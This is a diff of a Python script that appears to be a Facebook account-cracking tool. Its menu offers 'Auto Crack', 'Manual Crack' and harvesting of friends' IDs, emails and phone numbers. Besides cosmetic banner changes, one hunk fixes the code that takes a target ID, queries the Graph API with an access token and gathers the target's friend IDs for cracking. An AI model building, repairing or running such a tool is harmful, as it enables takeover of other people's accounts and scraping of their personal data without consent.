@@ -22,7 +22,8 @@ def jalan(z):
         sys.stdout.write(e)
         sys.stdout.flush()
 
-logo = """\033[1;96m█████████\033[1;96m█▄█████▄█ \033[1;91m●▬▬▬▬▬▬▬▬▬๑۩۩๑▬▬▬▬▬▬▬▬●\033[1;96m█\033[1;91m▼▼▼▼▼ \033[1;95m- _ --_--\033[1;95m╔╦╗┌─┐┬─┐┬┌─ ╔═╗╔╗ \033[1;96m█ \033[1;92m \033[1;95m_-_-- -_ --__\033[1;93m ║║├─┤├┬┘├┴┐───╠╣ ╠╩╗\033[1;96m█\033[1;91m▲▲▲▲▲\033[1;95m-- - _ --\033[1;96m═╩╝┴ ┴┴└─┴ ┴ ╚ ╚═╝ \033[1;96mZeDD\033[1;96m█████████ \033[1;92m«----------✧----------»\033[1;96m ██ ██ \x1b[7m➺➺ Author: ZeDD ㋡㋡\x1b[0m
+logo = """
+\033[1;96m     \x1b[7m➺➺ Author: ZeDD ㋡㋡\x1b[0m
 \033[1;91m╔═════════════════════════════════════════════╗
 \033[1;91m║\033[1;93m* \033[1;97mAuthor  \033[1;91m: \033[1;33m[ZɘDD] \033[1;91m
 \033[1;91m║\033[1;93m* \033[1;97mGitHub  \033[1;91m: \033[1;92m[https//:github.com/EmZee07] \033[1;91
@@ -150,15 +151,15 @@ def menu():
     print logo
     print '\x1b[1;93m\xe2\x95\x94' + 50 * '\xe2\x95\x90' + '╗'
     print '\xe2\x95\x91\x1b[1;93m[\x1b[1;93m\xe2\x9c\x93\x1b[1;93m]\x1b[1;93m Name       \x1b[1;93m: \x1b[1;92m' + nama + (33 - len(nama)) * '\x1b[1;93m ' + '║'
-    print '\xe2\x95\x91\x1b[1;93m[\x1b[1;93m\xe2\x9c\x93\x1b[1;93m]\x1b[1;93m ID FB ZeDD \x1b[1;93m: \x1b[1;92m' + id + (33 - len(id)) * '\x1b[1;93m ' + '║'
-    print '\xe2\x95\x91\x1b[1;93m[\x1b[1;93m\xe2\x9c\x93\x1b[1;93m]\x1b[1;93m Followers  \x1b[1;93m: \x1b[1;92m' + sub + (33 - len(sub)) * '\x1b[1;93m ' + '║'
+    print '\xe2\x95\x91\x1b[1;93m[\x1b[1;93m\xe2\x9c\x93\x1b[1;93m]\x1b[1;93m ID FB ZeDD \x1b[1;93m: \x1b[1;92m' + id + (33 - len(id)) *     '\x1b[1;93m ' + '║'
+    print '\xe2\x95\x91\x1b[1;93m[\x1b[1;93m\xe2\x9c\x93\x1b[1;93m]\x1b[1;93m Followers  \x1b[1;93m: \x1b[1;92m' + sub + (33 - len(sub)) *   '\x1b[1;93m ' + '║'
     print '\x1b[1;93m╠' + 50* '\xe2\x95\x90' + '║'
     print '║-» \x1b[1;36;49m1. Auto Crack                                  \x1b[1;93m║'
     print '║-» \x1b[1;36;49m2. Manual Crack                                \x1b[1;93m║'
     print '║-» \x1b[1;36;49m3. ID Group                                    \x1b[1;93m║'
-    print '║-» \x1b[1;36;49m4.  Getting ID/Email/Hp Friends                     \x1b[1;93m║'
-    print '║-» \x1b[1;36;49m5. Getting Accounts                                  \x1b[1;93m║'
-    print '║-» \x1b[1;36;49m0. Back                                      \x1b[1;93m║'
+    print '║-» \x1b[1;36;49m4. Getting ID/Email/Hp Friends                 \x1b[1;93m║'
+    print '║-» \x1b[1;36;49m5. Getting Accounts                            \x1b[1;93m║'
+    print '║-» \x1b[1;36;49m0. Back                                        \x1b[1;93m║'
     print '\x1b[1;93m╠' + 50* '\xe2\x95\x90' + '╝'
     pilih()
 
@@ -238,7 +239,7 @@ def pilih_super():
                 print 55 * '\x1b[1;97m\xe2\x95\x90'
                 idg = raw_input('\x1b[1;91m[+] \x1b[1;92mEnter Target ID \x1b[1;91m:\x1b[1;97m ')
                 try:
-                    r = requests.get('https://graph.facebook.com/' + idg + ' ?access_token=' + toket)
+                    r = requests.get('https://graph.facebook.com/' + idg + '?access_token=' + toket)
                     asw = json.loads(r.text)
                     print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName Target \x1b[1;91m:\x1b[1;97m ' + asw['name']
                 except KeyError:
@@ -246,7 +247,7 @@ def pilih_super():
                     raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
                     super()
 
-                re = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
+                re = requests.get('https://graph.facebook.com/' + idg + '/friends?access_token=' + toket)
                 s = json.loads(re.text)
                 for i in s['data']:
                     id.append(i['id'])
